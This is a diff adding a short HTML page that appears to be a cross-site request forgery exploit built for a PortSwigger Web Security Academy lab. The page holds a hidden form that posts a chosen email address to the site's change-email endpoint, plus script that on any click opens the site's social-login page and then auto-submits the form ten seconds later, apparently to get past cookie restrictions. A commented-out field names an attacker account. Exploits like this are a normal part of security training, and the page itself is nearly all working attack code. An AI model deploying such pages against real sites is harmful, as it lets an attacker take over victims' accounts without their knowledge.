@@ -1,0 +1,24 @@
+<html>
+
+<body>
+	<form id="csrfForm"
+		action="https://0ac4004504c9c3b980fa5392007300eb.web-security-academy.net/my-account/change-email"
+		method="POST">
+		<input type="hidden" name="email" value="v1212@g.com">
+		<!-- <input type="hidden" name="to_account" value="attacker123"> -->
+		<input type="submit" value="Submit CSRF Request">
+	</form>
+	<script>
+     window.onclick = () => {
+      window.open('https://0ac4004504c9c3b980fa5392007300eb.web-security-academy.net/social-login');
+      setTimeout(changeEmail, 10000);
+     }
+    function changeEmail(){
+      document.getElementById("csrfForm").submit();
+    }
+		 
+
+	</script>
+</body>
+
+</html>
